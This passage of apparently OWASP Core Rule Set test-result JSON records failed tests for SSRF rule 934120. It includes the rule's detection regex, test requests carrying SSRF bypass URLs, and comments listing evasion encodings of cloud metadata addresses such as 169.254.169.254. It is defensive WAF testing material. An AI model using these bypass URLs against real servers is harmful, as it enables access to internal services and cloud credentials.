          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 34,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - IPv6, link-local unicast with zone ID, full",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 34,
      "desc" : "SSRF - IPv6, link-local unicast with zone ID, full",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http://[fe80::dead:beef:dead:beef:dead:beef%zone1]",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 37,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - URL bypass, IP + domain",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 37,
      "desc" : "SSRF - URL bypass, IP + domain",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http://google.com%3A80%20%26%40127.88.23.245%3A22%2F%23%20%40google.com%3A80%2F",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 38,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - URL bypass, domain + IP",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 38,
      "desc" : "SSRF - URL bypass, domain + IP",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http://google.com%3A80%20%26%40google.com%3A80%23%20%40127.88.23.245%3A22%2F",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
